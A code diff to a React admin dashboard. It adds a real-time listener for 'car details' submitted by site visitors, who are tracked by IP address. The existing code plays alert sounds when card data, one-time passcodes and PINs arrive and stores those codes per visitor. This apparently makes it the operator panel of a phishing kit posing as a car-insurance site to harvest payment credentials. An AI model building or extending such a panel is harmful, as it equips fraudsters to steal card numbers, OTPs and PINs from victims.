@@ -11,7 +11,8 @@ import {
   playNewVisitorSound, 
   playCardDataSound, 
   playOTPSound, 
-  playPINSound 
+  playPINSound,
+  playCarDataSound
 } from '../utils/notificationSounds';
 import '../styles/AdminDashboard.css';
 
@@ -191,6 +192,60 @@ export default function AdminDashboard() {
       });
     });
 
+    // Listen for car details updates
+    socket.on('carDetailsUpdated', ({ ip, carDetails, timestamp, playSound }) => {
+      console.log('🚗 Car details updated for:', ip, carDetails);
+      
+      // Play notification sound
+      if (playSound) {
+        playCarDataSound();
+        setNewDataCount(prev => prev + 1);
+        setLastDataTimestamp(Date.now());
+        
+        // Clear badge after 5 seconds
+        setTimeout(() => {
+          setNewDataCount(0);
+        }, 5000);
+      }
+      
+      // Update customer in the list
+      setCustomers(prev => {
+        const customerIndex = prev.findIndex(c => c.ip === ip);
+        
+        if (customerIndex >= 0) {
+          // Update existing customer and move to top
+          const updatedCustomer = {
+            ...prev[customerIndex],
+            carDetails,
+            lastUpdate: new Date(timestamp).getTime()
+          };
+          
+          // Remove from current position and add to top
+          const newList = [...prev];
+          newList.splice(customerIndex, 1);
+          newList.unshift(updatedCustomer);
+          
+          return newList;
+        } else {
+          // Add new customer at top
+          return [{
+            ip,
+            currentPage: '/car-details',
+            carDetails,
+            moreDetails: null,
+            insurance: null,
+            customerInfo: null,
+            payments: [],
+            otpCodes: [],
+            pinCodes: [],
+            status: 'pending',
+            lastUpdate: new Date(timestamp).getTime(),
+            isActive: true
+          }, ...prev];
+        }
+      });
+    });
+
     return () => {
       clearInterval(refreshInterval);
       socket.off('initialData');
@@ -201,6 +256,7 @@ export default function AdminDashboard() {
       socket.off('userDisconnected');
       socket.off('locationUpdated');
       socket.off('customersUpdate');
+      socket.off('carDetailsUpdated');
     };
   }, [socket, connected]);
 
